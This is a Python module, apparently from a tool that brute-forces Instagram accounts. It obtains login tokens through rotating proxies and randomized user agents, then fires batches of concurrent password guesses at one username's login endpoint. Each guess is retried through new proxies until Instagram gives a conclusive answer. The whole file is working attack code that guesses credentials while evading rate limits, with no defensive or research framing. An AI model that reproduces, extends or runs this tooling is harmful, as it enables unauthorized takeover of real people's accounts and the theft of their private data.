from __future__ import absolute_import

import asyncio
import aiohttp

import random

from app import settings
from app.lib import exceptions
from app.lib.utils import get_token_from_response, cancel_remaining_tasks
from app.lib.logging import AppLogger, contextual_log
from app.lib.models import InstagramResult, LoginAttemptContext, LoginContext, TokenContext


from itertools import islice


def limited_as_completed(coros, limit):

    futures = [
        asyncio.ensure_future(c)
        for c in islice(coros, 0, limit)
    ]

    async def first_to_finish():
        while True:
            await asyncio.sleep(0)
            for f in futures:
                if f.done():
                    futures.remove(f)
                    try:
                        newf = next(coros)
                        futures.append(
                            asyncio.ensure_future(newf))
                    except StopIteration as e:
                        pass
                    return f.result()
    while len(futures) > 0:
        yield first_to_finish()


class HandlerSettings(object):

    # TODO
    # ATTEMPT_LIMIT = settings.REQUESTS.ATTEMPT_LIMIT.login

    @property
    def FIRST_ATTEMPT_LIMIT(self):
        return settings.REQUESTS.value(
            'FIRST_ATTEMPT_LIMIT', self.__handlername__)

    @property
    def CONNECTOR_KEEP_ALIVE_TIMEOUT(self):
        return settings.REQUESTS.value(
            'CONNECTOR_KEEP_ALIVE_TIMEOUT', self.__handlername__)

    @property
    def FETCH_TIME(self):
        return settings.REQUESTS.value(
            'FETCH_TIME', self.__handlername__)

    @property
    def MAX_REQUEST_RETRY_LIMIT(self):
        return settings.REQUESTS.value(
            'MAX_REQUEST_RETRY_LIMIT', self.__handlername__)


class request_handler(HandlerSettings):

    def __init__(self, config, proxy_handler):
        self.config = config

        self.user_agent = random.choice(settings.USER_AGENTS)
        self.stop_event = asyncio.Event()
        self.proxy_handler = proxy_handler

    def _headers(self):
        headers = settings.HEADER.copy()
        headers['user-agent'] = self.user_agent
        return headers

    @property
    def connector(self):
        """
        TCPConnector
        -------------
        keepalive_timeout (float) – timeout for connection reusing after
            releasing
        limit_per_host (int) – limit simultaneous connections to the same
            endpoint (default is 0)
        """
        return aiohttp.TCPConnector(
            ssl=False,
            limit=settings.CONNECTOR_LIMIT,  # The Default
            keepalive_timeout=self.CONNECTOR_KEEP_ALIVE_TIMEOUT,
            enable_cleanup_closed=True,
        )

    @property
    def timeout(self):
        return aiohttp.ClientTimeout(
            total=self.FETCH_TIME
        )


class token_handler(request_handler):

    __handlername__ = 'token'

    def _get_token_from_response(self, response):
        token = get_token_from_response(response)
        if not token:
            raise exceptions.TokenNotInResponse()
        return token

    @contextual_log
    async def request(self, session, context, retry=1):
        log = AppLogger('Sending Token Request')

        if retry != 1:
            log.info(f'Sending GET Request, Retry {retry}', extra={'context': context})
        else:
            log.info('Sending GET Request', extra={'context': context})

        try:
            async with session.get(
                settings.INSTAGRAM_URL,
                raise_for_status=True,
                headers=self._headers(),
                timeout=self.FETCH_TIME,
                proxy=context.proxy.url(scheme='http')
            ) as response:
                # Raise for status is automatically performed, so we do not have
                # to have a client response handler.
                try:
                    token = self._get_token_from_response(response)
                except exceptions.TokenNotInResponse as e:
                    log.warning(e, extra={'context': context})
                    return None
                else:
                    await self.proxy_handler.good.put(context.proxy)
                    return token

        except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
            log.warning(e, extra={'context': context})

            # We probably want to lower this number
            if retry < self.MAX_REQUEST_RETRY_LIMIT:
                # Session should still be alive.
                await asyncio.sleep(1)
                retry += 1
                return await self.request(session, context, retry=retry)
            else:
                log.error(e, extra={'context': context})
                return None

        except aiohttp.ClientError as e:
            log.error(e, extra={'context': context})
            return None

        except asyncio.CancelledError:
            return None

        except (TimeoutError, asyncio.TimeoutError) as e:
            log.error(e, extra={'context': context})
        except Exception as e:
            raise exceptions.FatalException(f'Uncaught Exception: {str(e)}')

    async def fetch(self):
        """
        Asyncio Docs:

        asyncio.as_completed

            Run awaitable objects in the aws set concurrently. Return an iterator
            of Future objects. Each Future object returned represents the earliest
            result from the set of the remaining awaitables.

            Raises asyncio.TimeoutError if the timeout occurs before all Futures are done.
        """
        tasks = []
        index = 0

        async with aiohttp.ClientSession(
            connector=self.connector,
            timeout=self.timeout
        ) as session:
            while index < self.FIRST_ATTEMPT_LIMIT:

                proxy = await self.proxy_handler.get_best()
                context = TokenContext(proxy=proxy, index=index)
                index += 1

                task = asyncio.ensure_future(self.request(session, context))
                tasks.append(task)

            # TODO: Incorporate some type of timeout as an edge cases if None of the
            # futures are finishing.
            for future in asyncio.as_completed(tasks, timeout=None):
                earliest_future = await future
                if earliest_future:
                    await cancel_remaining_tasks(tasks)
                    return earliest_future


class login_handler(request_handler):

    __handlername__ = 'login'

    def _login_data(self, password):
        return {
            settings.INSTAGRAM_USERNAME_FIELD: self.config.user.username,
            settings.INSTAGRAM_PASSWORD_FIELD: password
        }

    def _headers(self, token):
        headers = super(login_handler, self)._headers()
        headers[settings.TOKEN_HEADER] = token
        return headers

    async def _get_result_from_response(self, response, context):
        try:
            result = await response.json()
        except ValueError:
            raise exceptions.ResultNotInResponse()
        else:
            return InstagramResult.from_dict(result, context)

    @contextual_log
    async def _handle_client_response(self, response, context):
        """
        Takes the AIOHttp ClientResponse and tries to return a parsed
        InstagramResult object.

        For AIOHttp sessions and client responses, we cannot read the json
        after response.raise_for_status() has been called.

        Since a 400 response will have valid json that can indicate an authentication,
        via a `checkpoint_required` value, we cannot raise_for_status until after
        we try to first get the response json.
        """
        log = AppLogger('Handling Client Response')

        if response.status >= 400 and response.status < 500:
            log.debug('Response Status Code : %s' % response.status)
            if response.status == 400:
                return await self._get_result_from_response(response, context)
            else:
                response.raise_for_status()
        else:
            try:
                log.debug('Creating Result from Response')
                return await self._get_result_from_response(response, context)
            except exceptions.ResultNotInResponse as e:
                raise exceptions.FatalException(
                    "Unexpected behavior, result should be in response."
                )

    async def _handle_parsed_result(self, result, context):
        """
        Raises an exception if the result that was in the response is either
        non-conclusive or has an error in it.

        If the result does not have an error and is non conslusive, than we
        can assume that the proxy was most likely good.
        """
        if result.has_error:
            raise exceptions.InstagramResultError(result.error_message)
        else:
            if not result.conclusive:
                raise exceptions.InstagramResultError("Inconslusive result.")
            return result

    @contextual_log
    async def request(self, session, context, retry=1):
        """
        NOTE
        ----
        Once we get contextual_log working, we shouldn't have to keep manually
        supplying the context to all the log calls.

        Do not want to automatically raise for status because we can have
        a 400 error but enough info in response to authenticate.

        Also, once response.raise_for_status() is called, we cannot access
        the response.json().
        """
        # Autologger not working because of keyword argument
        log = AppLogger('Sending Login Request')

        if retry != 1:
            log.info(f'Sending POST Request, Retry {retry}', extra={'context': context})
        else:
            log.info('Sending POST Request', extra={'context': context})

        async def retry_request(e, time=1):
            log.error(e, extra={'context': context})
            log.warning(f'Sleeping for {time} Seconds...')
            await asyncio.sleep(time)
            return await self.request(session, context, retry=retry + 1)

        try:
            log.debug('Attempting Request')
            async with session.post(
                settings.INSTAGRAM_LOGIN_URL,
                headers=self._headers(context.token),
                data=self._login_data(context.password),
                timeout=self.FETCH_TIME,
                proxy=context.proxy.url(scheme='http')
            ) as response:
                # Only reason to log these errors here is to provide the response
                # object
                try:
                    log.debug('Handling Client Response')
                    result = await self._handle_client_response(response, context)
                    result = await self._handle_parsed_result(result, context)

                except exceptions.ResultNotInResponse as e:
                    log.error(e, extra={'response': response, 'context': context})

                except exceptions.InstagramResultError as e:
                    log.error(e, extra={'response': response, 'context': context})

                else:
                    if not result:
                        raise exceptions.FatalException("Result should not be None here.")

                    log.debug('Putting Proxy in Good Queue')
                    self.proxy_handler.good.put_nowait(context.proxy)
                    return result

        except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
            # We probably want to lower this number
            if retry < self.MAX_REQUEST_RETRY_LIMIT:
                return await retry_request(e, time=1)
            else:
                log.error(e, extra={'context': context})
                return None

        except aiohttp.ClientConnectionError as e:
            log.error(e, extra={'context': context})
            return None

        except OSError as e:
            # We have only seen this for the following:
            # >>> OSError: [Errno 24] Too many open files
            # >>> OSError: [Errno 54] Connection reste by peer
            # For the former, we want to sleep for a second, for the latter,
            # we want to move on to a new proxy.
            if e.errno == 54:
                log.error(e, extra={'context': context})
                return None
            elif e.errno == 24:
                if retry < self.MAX_REQUEST_RETRY_LIMIT:
                    return await retry_request(e, time=3)
                else:
                    log.error(e, extra={'context': context})
                    return None
            else:
                raise e

        except asyncio.CancelledError as e:
            return None
        except asyncio.TimeoutError as e:
            log.error(e, extra={'context': context})
        except aiohttp.ClientError as e:
            log.error(e, extra={'context': context})
        except Exception as e:
            log.critical("Uncaught Exception %s" % e.__class__.__name__)
            raise e

    @contextual_log
    async def attempt_login(self, session, context, results):
        """
        TODO
        -----
        Should we incorporate some type of limit here, so that we don't wind
        up trying to login with same password 100 times for safety?
        """
        log = AppLogger('Attempting Login')

        index = 0
        while True:
            proxy = await self.proxy_handler.get_best()
            context = LoginAttemptContext(
                index=index,
                parent_index=context.index,
                proxy=proxy,
                password=context.password,
                token=context.token
            )
            index += 1

            result = await self.request(session, context)

            if result and result.conclusive:
                log.debug('Got Conclusive Result')
                return result

    async def consume_passwords(self, loop, results, token):
        async with aiohttp.ClientSession(
            connector=self.connector,
            timeout=self.timeout
        ) as session:
            for res in limited_as_completed(
                (self.attempt_login(
                    session,
                    LoginContext(
                        index=i,
                        token=token,
                        password=password
                    ),
                    results
                ) for i, password in enumerate(
                    self.config.user.get_new_attempts(limit=self.config.limit)
                )),
                settings.REQUEST_BATCH_SIZE
            ):
                result = await res
                await results.put(result)
